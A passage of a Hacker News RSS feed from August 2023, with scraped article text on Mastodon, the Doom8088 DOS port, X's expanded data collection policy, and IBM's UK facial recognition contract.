this way. I’ve tried to expand the set of people I do this for over time – I
think it’s important to keep an eye out for coworkers who are really excelling
and to make sure their work is recognized.</p>



<p>I wanted to just talk about this one specific practice of telling someone’s
manager they’re doing great work but there are a LOT of other ways you can help
lift your coworkers up. Lara Hogan’s post <a href="https://larahogan.me/blog/what-sponsorship-looks-like/">what does sponsorship look
like?</a> has a lot of
great examples.</p>

<p>Mekka Okereke has a wonderful Twitter thread about another way you can support
underrepresented folks: by being a <a href="https://twitter.com/mekkaokereke/status/1027552459873378304">“difficulty anchor”</a>. It’s
short and definitely worth a read.</p>

<p><small>thanks to Sher Minn Chong, Allie Jones, and Kamal Marhubi for reading a draft of this</small></p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[RFC 3339 vs. ISO 8601 (401 pts)]]></title>
            <link>https://ijmacd.github.io/rfc3339-iso8601/</link>
            <guid>37339535</guid>
            <pubDate>Thu, 31 Aug 2023 16:12:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ijmacd.github.io/rfc3339-iso8601/">https://ijmacd.github.io/rfc3339-iso8601/</a>, See on <a href="https://news.ycombinator.com/item?id=37339535">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Mastodon Is Rewinding the Clock on Social Media – In a Good Way (128 pts)]]></title>
            <link>https://chrlschn.medium.com/mastodon-is-rewinding-the-clock-on-social-media-in-a-good-way-8998f6d9f1aa</link>
            <guid>37339485</guid>
            <pubDate>Thu, 31 Aug 2023 16:10:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chrlschn.medium.com/mastodon-is-rewinding-the-clock-on-social-media-in-a-good-way-8998f6d9f1aa">https://chrlschn.medium.com/mastodon-is-rewinding-the-clock-on-social-media-in-a-good-way-8998f6d9f1aa</a>, See on <a href="https://news.ycombinator.com/item?id=37339485">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p id="2537">If you think back on the early days of Facebook and Twitter, what was great was that it was mostly content that you <em>wanted </em>to see or <em>opted-in</em> to see. You did this by following people or following hashtags.</p><p id="f515">Today?</p><p id="c5b6">Well, you’ve probably noticed that your X and Facebook feeds are filled with:</p><ol><li id="a315"><em>Ads</em></li><li id="a713">Content from people you didn’t actually choose to follow</li><li id="caac"><em>Ads</em></li><li id="2cd9">Content that is indistinguishable from an ad</li><li id="1fdc"><em>Ads</em></li><li id="4432">Content seemingly being pushed with some agenda</li><li id="ae27"><em>Ads</em></li><li id="8958">Elon</li><li id="e5c5"><em>Ads</em></li><li id="3b78">Updates from people you explicitly and actively chose to follow.</li></ol><blockquote><p id="706e"><em>Why am I seeing this and how do I make it go away?</em></p></blockquote><p id="413e">For example:</p><figure><figcaption>A “Suggested for you” entry in my feed.</figcaption></figure><p id="e1d3">I’m <strong><em>not</em></strong><em> </em>a Connor McGregor fan nor am I even interested in UFC in the slightest; <em>why is this in my feed</em> 🤷‍♂️?</p><p id="6d4b">This is at the top of my X feed:</p><figure><figcaption>Hmmm….X taking “enshittification” very literally</figcaption></figure><p id="9bf5">If this experience with social media platforms resonates with you, then Mastodon is for you.</p></div><div><p id="2304">In many ways, Mastodon feels like rewinding the clock on social media back to the early days of Twitter and Facebook. On the consume side, that means that your home feed <em>has no algorithm </em>(this can be disorienting at first).</p><p id="e65d">Practically, it means that you see only what you want to see and only see it linearly. You never wonder “<em>why am I seeing this and how do I make it go away?</em>”. Content can only enter your home feed via your followed tags or handles and the feed is linear like the early days of social media.</p><p id="75b3">Early Facebook was great; I personally used it as a news feed as I would only like and follow sources I wanted news from. Occasionally, I’d also see updates from my friends and family.</p><p id="adbc">Today?</p><p id="2d6e">The feed is algorithmically assembled and full of content that is an ad or is indistinguishable from an ad. Because of course, <em>both Facebook and X make their money from ads and algorithmic engagement</em>. <em>The entire point is to</em> <em>serve you more ads!</em></p><p id="1c80">Am I seeing this because someone paid to boost their views? How do I get this feed to behave? How can I stop this content from showing in my feed? Hypothetical questions; maybe it’s possible with a lot of tuning and configuration, but Mastodon just does exactly what I want/expect out-of-the-box: <strong><em>follow these tags + follow these people = see this content in a linear flow</em></strong>.</p><p id="bb0d">To me, this simplicity makes it much more useful and approachable on the consume side.</p><p id="f47a">On the publish side, one of the neat features of Mastodon is that it lets you see the activity levels of tags in the past week. This makes it easier to decide “how should I tag this content?”:</p><figure></figure><p id="8c0c">This is especially useful when trying to reach an audience in a niche community.</p><p id="4a94">One other key aspect that feels like it should be obvious — but may not be because of how jaded we are nowadays — is that you don’t have to figure out the platform settings for privacy to opt out of ads, AI, tracking, and so on. Yes, there are still privacy settings to toggle, but Mastodon <em>isn’t an ad platform </em>and doesn’t make money from being able to track you across the web and feeding you ads (“re-targeting” in marketing speak).</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Doom for 16-bit DOS computers (144 pts)]]></title>
            <link>https://github.com/FrenkelS/Doom8088</link>
            <guid>37339372</guid>
            <pubDate>Thu, 31 Aug 2023 16:04:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/FrenkelS/Doom8088">https://github.com/FrenkelS/Doom8088</a>, See on <a href="https://news.ycombinator.com/item?id=37339372">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-view-component="true">        
        
        <div>
  



<div data-modal-dialog-overlay="">
  <modal-dialog role="dialog" id="warn-tag-match-create-branch-dialog" aria-modal="true" aria-labelledby="warn-tag-match-create-branch-dialog-header" data-view-component="true">
      <header>
        <div>
          <p>
            <h2 id="warn-tag-match-create-branch-dialog-header">Name already in use</h2>
          </p>
          
        </div>
      </header>
    <div>
      
          <p>      A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?
</p>

    </div>
      
</modal-dialog></div>



  <p>
    <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/FrenkelS/Doom8088/branches">
          
          <strong>1</strong>
          <span>branch</span>
    </a>
    <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="https://github.com/FrenkelS/Doom8088/tags">
      
        <strong>1</strong>
        <span>tag</span>
    </a>
  </p>

  

  <include-fragment src="/FrenkelS/Doom8088/overview_actions/main"></include-fragment>


    <p><span>
        
<get-repo>
    
    <details data-action="
               toggle:get-repo#onDetailsToggle
               keydown:get-repo#onDetailsKeydown">
        <summary data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;repository_id&quot;:684200902,&quot;target&quot;:&quot;CLONE_OR_DOWNLOAD_BUTTON&quot;,&quot;originating_url&quot;:&quot;https://github.com/FrenkelS/Doom8088&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="0d629a7648c3e23e25e4b2f5e32965f4ab7afa948247c3c66f299b03706bc620" data-view-component="true">    <span>
      <span>Code</span>
    </span>
      <span>
        
      </span>
</summary>  
      <div data-target="get-repo.modal">
    <tab-container data-view-component="true">
      <div id="local-panel" role="tabpanel" tabindex="0" aria-labelledby="local-tab" data-view-component="true">          <ul>
              <li>
  <a href="https://docs.github.com/articles/which-remote-url-should-i-use" rel="noopener" target="_blank" aria-label="Which remote URL should I use?">
  
</a>



<tab-container>

  

  <div role="tabpanel">
    

    <p>
        Use Git or checkout with SVN using the web URL.
    </p>
  </div>


  
</tab-container>

</li>
<li data-platforms="windows,mac">
  <a data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;REPOSITORY&quot;,&quot;repository_id&quot;:684200902,&quot;originating_url&quot;:&quot;https://github.com/FrenkelS/Doom8088&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="3e2302a9e65fab2922fc37db76acfe92f418653817e8bf043b1fd942ced72d7c" data-action="click:get-repo#showDownloadMessage" href="https://desktop.github.com/">
    
    Open with GitHub Desktop
</a></li>
<li>
  <a rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;REPOSITORY&quot;,&quot;repository_id&quot;:684200902,&quot;originating_url&quot;:&quot;https://github.com/FrenkelS/Doom8088&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="639d809ca876f8ffdd884143ae5a6c3d2117ad2d6669701c8f700769792e0638" data-ga-click="Repository, download zip, location:repo overview" data-open-app="link" data-turbo="false" href="https://github.com/FrenkelS/Doom8088/archive/refs/heads/main.zip">
    
    Download ZIP
</a></li>

          </ul>
</div>
    
</tab-container>    
</div>
    </details>


</get-repo>

    </span>

    <span>
        

    </span>
</p></div>




        


<div>
  <div>
    <h2>Latest commit</h2>
    <div data-issue-and-pr-hovercards-enabled="">
  <p><a data-test-selector="commits-avatar-stack-avatar-link" data-hovercard-type="user" data-hovercard-url="/users/FrenkelS/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/FrenkelS">
        <img data-test-selector="commits-avatar-stack-avatar-image" src="https://avatars.githubusercontent.com/u/73123197?s=48&amp;v=4" width="24" height="24" alt="@FrenkelS">
</a>  </p>
</div>
  </div>
    <h2 id="files">Files</h2>
    


      <p><a data-hotkey="y" href="https://github.com/FrenkelS/Doom8088/tree/2001f8c2576a2e99f3c588e201ceb3e31d16e8b7">Permalink</a></p><div data-view-component="true">
  <p>
    Failed to load latest commit information.


  
</p></div>  <div role="grid" aria-labelledby="files" data-hpc="">
        <p>Type</p>
        <p>Name</p>
        <p>Latest commit message</p>
        <p>Commit time</p>
      </div>




</div>

  
      <readme-toc>

      <div data-target="readme-toc.content" id="readme" data-tagsearch-path="README.md" data-tagsearch-lang="Markdown">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Doom8088</h2>
<p dir="auto">Doom8088 is a port of Doom for PCs with a 16-bit processor like an 8088 or a 286.
It's based on <a href="https://github.com/doomhack/GBADoom">GBADoom</a>.
Download Doom8088 <a href="https://github.com/FrenkelS/Doom8088/releases">here</a>.</p>
<p dir="auto"><strong>What's special?:</strong></p>
<ul dir="auto">
<li>No sound and music</li>
<li>No saving and loading</li>
<li>No multiplayer</li>
<li>No PWADs</li>
<li>Supports only Doom 1 Episode 1</li>
<li>Only demo3 is in sync</li>
<li>Lots of crashes due to memory issues</li>
<li>Super slow because for every frame every necessary image is read from the hard disk and for every calculation involving a lookup table the hard disk is also accessed</li>
</ul>
<h2 tabindex="-1" dir="auto">Controls:</h2>
<table>
<thead>
<tr>
<th>Action</th>
<th>GBA</th>
<th>DOS</th>
</tr>
</thead>
<tbody>
<tr>
<td>Fire</td>
<td>B</td>
<td>Ctrl</td>
</tr>
<tr>
<td>Use / Sprint</td>
<td>A</td>
<td>Enter, Space &amp; Shift</td>
</tr>
<tr>
<td>Walk</td>
<td>D-Pad</td>
<td>Arrow keys</td>
</tr>
<tr>
<td>Strafe</td>
<td>L &amp; R</td>
<td>&lt; &amp; &gt;</td>
</tr>
<tr>
<td>Automap</td>
<td>SELECT</td>
<td>Tab</td>
</tr>
<tr>
<td>Weapon up</td>
<td>A + R</td>
<td>Enter, Space &amp; Shift + &gt;</td>
</tr>
<tr>
<td>Weapon down</td>
<td>A + L</td>
<td>Enter, Space &amp; Shift + &lt;</td>
</tr>
<tr>
<td>Menu</td>
<td>Start</td>
<td>Esc</td>
</tr>
<tr>
<td>Quit to DOS</td>
<td></td>
<td>F10</td>
</tr>
</tbody>
</table>
<h2 tabindex="-1" dir="auto">Building:</h2>
<ol dir="auto">
<li>
<p dir="auto">Install <a href="https://github.com/open-watcom/open-watcom-v2">Watcom</a></p>
</li>
<li>
<p dir="auto">Run <code>setenvwc.bat</code> and then <code>compwc16.bat</code></p>
</li>
<li>
<p dir="auto">Compress <code>DOOM8088.EXE</code> with <a href="https://bellard.org/lzexe.html" rel="nofollow">LZEXE</a>, just like all the other 16-bit id Software games.</p>
</li>
<li>
<p dir="auto">Doom8088 needs an IWAD file that has been processed by <a href="https://github.com/doomhack/GbaWadUtil">GbaWadUtil</a>.
Some lumps in the WAD need to be replaced by the raw pictures from the WAD directory of this repository.</p>
</li>
</ol>
<p dir="auto">It's possible to build a 32-bit version of Doom8088 with Watcom and <a href="https://github.com/andrewwutw/build-djgpp">DJGPP</a>. For debugging purposes, the Zone memory can be increased significantly this way.</p>
</article>
          </div>

  </readme-toc>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Electronics Course (45 episodes, YouTube) (140 pts)]]></title>
            <link>https://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v</link>
            <guid>37339348</guid>
            <pubDate>Thu, 31 Aug 2023 16:03:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v">https://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v</a>, See on <a href="https://news.ycombinator.com/item?id=37339348">Hacker News</a></p>
<div id="readability-page-1" class="page"><ytd-app><ytd-masthead id="masthead" logo-type="YOUTUBE_LOGO" slot="masthead"></ytd-masthead></ytd-app><title>Razavi Electronics - YouTube</title><meta property="og:site_name" content="YouTube"><meta property="og:url" content="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v"><meta property="og:title" content="Razavi Electronics"><meta property="og:description" content=""><meta property="og:image" content="https://i.ytimg.com/vi/yQDfVJzEymI/hqdefault.jpg?sqp=-oaymwEWCKgBEF5IWvKriqkDCQgBFQAAiEIYAQ==&amp;rs=AOn4CLCoP7fy4dj_zXWMJ0Jt4cL3Y-KR_A&amp;days_since_epoch=19600"><meta property="og:image:width" content="168"><meta property="og:image:height" content="94"><meta property="og:image" content="https://i.ytimg.com/vi/yQDfVJzEymI/hqdefault.jpg?sqp=-oaymwEWCMQBEG5IWvKriqkDCQgBFQAAiEIYAQ==&amp;rs=AOn4CLDd30k9mSlUJaVAXII-IeiBS2gU0A&amp;days_since_epoch=19600"><meta property="og:image:width" content="196"><meta property="og:image:height" content="110"><meta property="og:image" content="https://i.ytimg.com/vi/yQDfVJzEymI/hqdefault.jpg?sqp=-oaymwEXCPYBEIoBSFryq4qpAwkIARUAAIhCGAE=&amp;rs=AOn4CLC9MrcEbLjdroZjuuOsW92Qz_DpiA&amp;days_since_epoch=19600"><meta property="og:image:width" content="246"><meta property="og:image:height" content="138"><meta property="og:image" content="https://i.ytimg.com/vi/yQDfVJzEymI/hqdefault.jpg?sqp=-oaymwEXCNACELwBSFryq4qpAwkIARUAAIhCGAE=&amp;rs=AOn4CLCe22WCCHHkQpheKfpcxHCX8QnGcQ&amp;days_since_epoch=19600"><meta property="og:image:width" content="336"><meta property="og:image:height" content="188"><meta name="apple-itunes-app" content="app-id=544007664" app-argument="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v"><meta property="al:ios:app_store_id" content="544007664"><meta property="al:ios:app_name" content="YouTube"><meta property="al:ios:url" content="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v&amp;feature=applinks"><meta property="al:android:url" content="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v&amp;feature=applinks"><meta property="al:android:app_name" content="YouTube"><meta property="al:android:package" content="com.google.android.youtube"><meta property="al:web:url" content="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v&amp;feature=applinks"><meta property="al:web:should_fallback" content="true"><meta property="og:type" content="website"><meta property="fb:app_id" content="87741124305"><meta property="og:restrictions:age" content="18+"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@YouTube"><meta name="twitter:url" content="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v"><meta name="twitter:title" content="Razavi Electronics"><meta name="twitter:description" content=""><meta name="twitter:image" content="https://i.ytimg.com/vi/yQDfVJzEymI/hqdefault.jpg?sqp=-oaymwEWCKgBEF5IWvKriqkDCQgBFQAAiEIYAQ==&amp;rs=AOn4CLCoP7fy4dj_zXWMJ0Jt4cL3Y-KR_A&amp;days_since_epoch=19600"><meta name="twitter:image" content="https://i.ytimg.com/vi/yQDfVJzEymI/hqdefault.jpg?sqp=-oaymwEWCMQBEG5IWvKriqkDCQgBFQAAiEIYAQ==&amp;rs=AOn4CLDd30k9mSlUJaVAXII-IeiBS2gU0A&amp;days_since_epoch=19600"><meta name="twitter:image" content="https://i.ytimg.com/vi/yQDfVJzEymI/hqdefault.jpg?sqp=-oaymwEXCPYBEIoBSFryq4qpAwkIARUAAIhCGAE=&amp;rs=AOn4CLC9MrcEbLjdroZjuuOsW92Qz_DpiA&amp;days_since_epoch=19600"><meta name="twitter:image" content="https://i.ytimg.com/vi/yQDfVJzEymI/hqdefault.jpg?sqp=-oaymwEXCNACELwBSFryq4qpAwkIARUAAIhCGAE=&amp;rs=AOn4CLCe22WCCHHkQpheKfpcxHCX8QnGcQ&amp;days_since_epoch=19600"><meta name="twitter:app:name:iphone" content="YouTube"><meta name="twitter:app:id:iphone" content="544007664"><meta name="twitter:app:url:iphone" content="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v&amp;feature=twitter-deep-link"><meta name="twitter:app:name:ipad" content="YouTube"><meta name="twitter:app:id:ipad" content="544007664"><meta name="twitter:app:url:ipad" content="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v&amp;feature=twitter-deep-link"><meta name="twitter:app:name:googleplay" content="YouTube"><meta name="twitter:app:id:googleplay" content="com.google.android.youtube"><meta name="twitter:app:url:googleplay" content="http://www.youtube.com/playlist?list=PL7qUW0KPfsIIOPOKL84wK_Qj9N7gvJX6v&amp;feature=twitter-deep-link"><meta name="title" content="Razavi Electronics"><meta name="description" content="Teile deine Videos mit Freunden, Verwandten oder der ganzen Welt"><meta name="keywords" content="Video, teilen, Kamerahandy, Videohandy, kostenlos, hochladen"></div>]]></description>
        </item>
        <item>
            <title><![CDATA[X wants permission to start collecting your bio data and employment history (182 pts)]]></title>
            <link>https://www.theverge.com/2023/8/31/23853618/x-privacy-policy-update-biometrics-job-history</link>
            <guid>37338585</guid>
            <pubDate>Thu, 31 Aug 2023 15:20:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/2023/8/31/23853618/x-privacy-policy-update-biometrics-job-history">https://www.theverge.com/2023/8/31/23853618/x-privacy-policy-update-biometrics-job-history</a>, See on <a href="https://news.ycombinator.com/item?id=37338585">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>X, the platform previously known as Twitter, is expanding the amount of data it collects on users. The social network has updated its <a href="https://twitter.com/en/privacy#x-privacy-1">privacy policy</a> to include carveouts for “biometric information” and “employment history,” <a href="https://www.bloomberg.com/news/articles/2023-08-31/x-plans-to-collect-user-biometric-data-job-and-education-history?sref=ExbtjcSG">as spotted by <em>Bloomberg</em></a>.</p><p>“Based on your consent, we may collect and use your biometric information for safety, security, and identification purposes,” the privacy policy reads. It doesn’t include any details on what kind of biometric information this includes — or how X plans to collect it — but it typically involves fingerprints, iris patterns, or facial features. </p><p>X Corp. was named in a <a href="https://s3.amazonaws.com/jnswire/jns-media/4e/52/13288870/2023ch06416.pdf">proposed class action lawsuit</a> in July over claims that its data collection violates the Illinois Biometric Information Privacy Act. The lawsuit alleges that X “has not adequately informed individuals” that it “collects and/or stores their biometric identifiers in every photograph containing a face” that’s uploaded to the platform.</p><p>One possibility for using biometric data is enabling passwordless sign-ins. According to <a href="https://www.thetapedrive.com/p/x-twitter-and-linkedin-to-support">findings from app developer Steve Moser</a>, X plans on rolling out support for <a href="https://www.theverge.com/2022/8/5/23293643/apple-passkeys-fido-alliance-passwordless-google-microsoft">passkeys</a>, which can use your device’s fingerprint, facial recognition, or PIN to log in to your account.</p><p>The privacy policy adds that X may also collect “your employment history, educational history, employment preferences, skills and abilities, job search activity and engagement.” That’s likely related to the job search features that X owner Elon Musk has hinted at including. The platform <a href="https://twitter.com/XHiring/status/1695154429828247798?s=20">rolled out the beta of a hiring feature</a> for companies last week and <a href="https://twitter.com/elonmusk/status/1697145283472244974?s=20">also plans on adding video and audio calls</a> with “no phone number needed.”</p><p>The current privacy policy, <a href="https://twitter.com/en/privacy#twitter-privacy-1">which you can read here</a>, makes no mention of the collection of biometric data or information related to employment history. According to a notice at the top of the page, the new policy doesn’t go into effect until September 29th, 2023.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[IBM promised to back off facial recognition, then signed a $70M contract for it (231 pts)]]></title>
            <link>https://www.theverge.com/2023/8/31/23852955/ibm-uk-government-contract-biometric-facial-recognition</link>
            <guid>37337771</guid>
            <pubDate>Thu, 31 Aug 2023 14:35:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/2023/8/31/23852955/ibm-uk-government-contract-biometric-facial-recognition">https://www.theverge.com/2023/8/31/23852955/ibm-uk-government-contract-biometric-facial-recognition</a>, See on <a href="https://news.ycombinator.com/item?id=37337771">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>IBM has returned to the facial recognition market — just three years after <a href="https://www.theverge.com/2020/6/8/21284683/ibm-no-longer-general-purpose-facial-recognition-analysis-software">announcing it was abandoning work on the technology</a> due to concerns about racial profiling, mass surveillance, and other human rights violations.</p><p>In June 2020, as Black Lives Matter protests swept the US after George Floyd’s murder, IBM chief executive Arvind Krishna <a href="https://web.archive.org/web/20200609031426/https:/www.ibm.com/blogs/policy/facial-recognition-susset-racial-justice-reforms/">wrote a letter to Congress</a> announcing that the company would no longer offer “general purpose” facial recognition technology. “The fight against racism is as urgent as ever,” he wrote. “IBM firmly opposes and will not condone uses of any technology, including facial recognition technology offered by other vendors, for mass surveillance, racial profiling, violations of basic human rights and freedoms, or any purpose which is not consistent with our values and Principles of Trust and Transparency.” Later that year, the company redoubled its commitment, calling for US export controls to address concerns that facial recognition could be used overseas “to suppress dissent, to infringe on the rights of minorities, or to erase basic expectations of privacy.”</p><p>Despite these announcements, last month, IBM signed a $69.8 million (£54.7 million) contract with the British government to develop a national biometrics platform that will offer a facial recognition function to immigration and law enforcement officials, according to documents reviewed by <em>The Verge</em> and <a href="https://libertyinvestigates.org.uk/">Liberty Investigates</a>, an investigative journalism unit in the UK.</p><p>A <a href="https://www.find-tender.service.gov.uk/Notice/021422-2023?origin=SearchResults&amp;p=1">contract notice</a> for the Home Office Biometrics Matcher Platform outlines how the project initially involves developing a fingerprint matching capability, while later stages introduce facial recognition for immigration purposes — described as “an enabler for strategic facial matching for law enforcement.” The final stage of the project is described as delivery of a “facial matching for law enforcement use-case.”</p><div><p>The Home Office Biometrics Matcher Platform includes “strategic” matching of photos in a database</p></div><p>The platform will allow photos of individuals to be matched against images stored on a database — what is sometimes known as a “one-to-many” matching system. In September 2020, IBM described such “one-to-many” matching systems as “the type of facial recognition technology most likely to be used for mass surveillance, racial profiling, or other violations of human rights.”</p><p>IBM spokesman Imtiaz Mufti denied that its work on the contract was in conflict with its 2020 commitments. “IBM no longer offers general-purpose facial recognition and, consistent with our 2020 commitment, does not support the use of facial recognition for mass surveillance, racial profiling, or other human rights violations,” he said.</p><p>“The Home Office Biometrics Matcher Platform and associated Services contract is not used in mass surveillance. It supports police and immigration services in identifying suspects against a database of fingerprint and photo data. It is not capable of video ingest, which would typically be needed to support face-in-a-crowd biometric usage.”</p><p>Human rights campaigners, however, said IBM’s work on the project is incompatible with its 2020 commitments. Kojo Kyerewaa of Black Lives Matter UK said: “IBM has shown itself willing to step over the body and memory of George Floyd to chase a Home Office contract. This won’t be forgotten.”</p><p>Matt Mahmoudi, PhD, tech researcher at Amnesty International, said: “The research across the globe is clear; there is no application of one-to-many facial recognition that is compatible with human rights law, and companies — including IBM — must therefore cease its sale, and honor their earlier statements to sunset these tools, even and especially in the context of law and immigration enforcement where the rights implications are compounding.”</p><div><p>“There is no application of one-to-many facial recognition that is compatible with human rights law.”</p></div><p>Police use of facial recognition has been linked to wrongful arrests in the US and has been challenged in the UK courts. In 2019, an independent report on the London Metropolitan Police Service’s use of live facial recognition found there was no “explicit legal basis” for the force’s use of the technology and raised concerns that it may have breached human rights law. In August of the following year, the UK’s Court of Appeal ruled that South Wales Police’s use of facial recognition technology breached privacy rights and broke equality laws. The force paused its use of facial recognition after the verdict but has since resumed using the technology.</p><p>Other tech firms have imposed partial bans on the use of their facial recognition services for law enforcement. In the days after IBM declared its plans to leave the facial recognition sector, Amazon and Microsoft both announced moratoriums on the sale of their facial recognition services to police departments in the US.</p><p>Amazon initially announced a one-year moratorium on police use of its Rekognition software in June 2020 and said it would be extending the ban “indefinitely” the following year. A spokeswoman for the company confirmed that the moratorium, which prohibits “use of Amazon Rekognition’s face comparison feature by police departments in connection with criminal investigations,” is still in place.</p><p>Microsoft said in June 2020 that it would not sell facial recognition software to US police departments until a national law is introduced governing use of the technology. When contacted by <em>The Verge</em> and Liberty Investigates, a spokeswoman for Microsoft referred to the company’s website, which states that use of the Azure AI Face service “by or for state or local police in the US is prohibited by Microsoft policy.”&nbsp;</p><p>The UK Home Office did not respond to a request for comment.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ghostfolio: Open-source wealth management software (380 pts)]]></title>
            <link>https://ghostfol.io</link>
            <guid>37337482</guid>
            <pubDate>Thu, 31 Aug 2023 14:15:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ghostfol.io">https://ghostfol.io</a>, See on <a href="https://news.ycombinator.com/item?id=37337482">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
    </channel>
</rss>